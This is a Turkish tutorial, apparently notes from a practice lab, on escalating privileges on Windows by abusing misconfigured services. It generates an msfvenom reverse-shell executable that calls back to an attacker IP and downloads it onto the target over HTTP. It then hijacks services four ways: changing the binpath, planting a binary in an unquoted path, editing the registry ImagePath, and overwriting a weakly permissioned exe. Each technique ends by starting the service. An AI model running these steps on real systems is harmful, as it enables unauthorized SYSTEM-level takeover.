## Gerekli Exe

Çoğunlukla yetki yükseltmesi için kullanacağımız, shell üreten msfvenom exesi için

```auto
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP ADDRESI> LPORT=4343 -f exe -o reverse.exe
```

komutunu kullanabilir. Ve daha sonra

```auto
python -m http.server
```

komutuyla python ile web sunucusu başlatıp. Windows'ta çalıştıracağımız

```auto
Invoke-WebRequest -Uri "http://<IP ADDRESI>:8000/reverse.exe" -OutFile .\Desktop\reverse.exe
```

PowerShell komutu ile bu exeyi masaüstüne aktarabiliriz.

## Hizmetler

Windows'ta hizmetler, arka planda çalışan ve kullanıcı arayüzüne sahip olmayan uygulamalardır. Çeşitli görevleri otomatikleştirmek ve sistem kaynaklarını yönetmek için kullanılırlar.

## Hizmet İzinleri

Sysinternals AccessChk, yöneticilerin Windows'ta kaynaklara erişim izinlerini denetlemesini sağlayan güçlü bir komut satırı aracıdır.

"Authenticated Users" herhangi bir hizmeti değiştirip değiştiremiyor mu kontrol etmeniz önerilir.

```auto
.\accesschk64.exe -uwcqv <KULLANICI> * /accepteula
```

Belirli bir hizmeti kontrol etmek için

```auto
.\accesschk64.exe -ucqv <SERVICE> /accepteula
```

Kullanıcınız eğer bir hizmetin ayarlarını değiştirebiliyor ise (SERVICE_CHANGE_CONFIG yetkisi) hizmetin çalıştırdığı .exe değiştirilebilir.

```auto
.\accesschk64.exe -uwcqv user *

Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

RW svcconfig
        SERVICE_CHANGE_CONFIG
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

Kendi kontrol ettiğimiz bir exeyi hedef gösterip

```auto
PS C:\Users\user> sc.exe config svcconfig binpath="C:\Users\user\Desktop\reverse.exe"
[SC] ChangeServiceConfig SUCCESS
```

Hizmeti çalıştırırsak

```auto
start-service svcconfig
```

## Tırnaksız Hizmet Yolları

Bir hizmet yolu (ör.

C:\Program Files\My Service\Service Files\Service.exe

) boşluklar içeriyor ve tırnak işaretleri içine alınmamışsa, Windows boşluktan öncesini kendi tamamlamaya çalışır.

Yukarıdaki örneğe göre Windows'un arama sırası şöyle olacaktır:

- C:\Program
- C:\Program Files
- C:\Program Files\My
- C:\Program Files\My Service
- C:\Program Files\My Service\Service
- C:\Program Files\My Service\Service Files
- C:\Program Files\My Service\Service Files\Service.exe

Bu yol arama mantığını kullanabiliriz.

Hizmet exesinin bulunduğu yolun iki üstündeki dizine (yani örneğe göre

My Service

dizini) kullanıcının yazma izni varsa, service.exe'yi

C:\Program Files\My Service\Service.exe

altına atmak, hizmetin oradan çalıştırılmasını sağlar.

Yazma iznimiz olduğu için de istediğimiz bir exe'yi çalıştırabiliriz.

svcunquoted adlı hizmetin yolunu öğrenelim.

```auto
PS C:\Users\user\Desktop> Get-WmiObject win32_service | ?{$_.Name -like '*svcunquoted*'} | select Name, DisplayName, State, PathName

Name        DisplayName State   PathName
----        ----------- -----   --------
svcunquoted svcunquoted Stopped C:\Program Files\Unquoted Service\Required Files\service.exe
```

'Unquoted Service' adlı dizinin yetkilerini öğrenip 'BUILTIN\Users' için filtreleme yaparsak kullanıcıların yazma izni olduğunu görebiliriz.

```auto
PS C:\Users\user\Desktop> get-acl 'C:\Program Files\Unquoted Service' | ForEach-Object Access | where identityreference -eq 'BUILTIN\Users'

AccessControlType : Allow

PropagationFlags  : None

FileSystemRights  : ReadAndExecute, Synchronize
AccessControlType : Allow
IdentityReference : BUILTIN\Users
IsInherited       : True

FileSystemRights  : -1610612736
```

Exeyi gerekli yola kopyalayıp hizmeti çalıştırırsak bağlantı gelir.

```auto
PS C:\Users\user\Desktop> cp C:\Users\user\Desktop\reverse.exe 'C:\Program Files\Unquoted Service\Required.exe'
```

```auto
PS C:\Users\user\Desktop> start-service svcunquoted
```

## Registry ile Değiştirme

Eğer herhangi bir hizmetin registry değerini değiştirebiliyorsanız, registryde bulunan ImagePath değerini sizin kontrol ettiğiniz bir exe ile değiştirebilirsiniz.

```auto
PS C:\Users\user\Desktop> .\accesschk64.exe -k "HKLM\System\CurrentControlSet\Services\svcregistry" -d

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

HKLM\System\CurrentControlSet\Services\svcregistry
  RW BUILTIN\Users
  RW BUILTIN\Administrators
...
```

RW izinlerine dikkat edin.

```auto
Set-ItemProperty HKLM:\System\CurrentControlSet\Services\svcregistry -name ImagePath -Value 'C:\Users\user\Desktop\reverse.exe'
```

```auto
start-service svcregistry
```

## Güvensiz Exe Dosyası

Eğer hizmetin çalıştırdığı exe güvensiz izinlere sahipse ve kullanıcılar üzerine yazabiliyorsa bu exeyi değiştirebiliriz.

```auto
.\accesschk64.exe -ucqv svcfileperms
```

Görüldüğü üzere hizmette veya registry'de bir oynama yapamıyoruz.

```auto
PS C:\Users\user\Desktop> Get-WmiObject win32_service | ?{$_.Name -like '*svcfileperms*'} | select Name, DisplayName, State, PathName

Name         DisplayName  State   PathName
----         -----------  -----   --------
svcfileperms svcfileperms Stopped C:\Program Files\FilePerms\service.exe
```

```auto
PS C:\Users\user\Desktop> get-acl 'C:\Program Files\FilePerms\service.exe' | foreach Access

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

...
```

Ama hizmetin exesi üzerinde tam yetkimiz var.

Bu dosyanın üzerine yazabiliriz

```auto
cp .\reverse.exe 'C:\Program Files\FilePerms\service.exe'
```

```auto
start-service svcfileperms
```
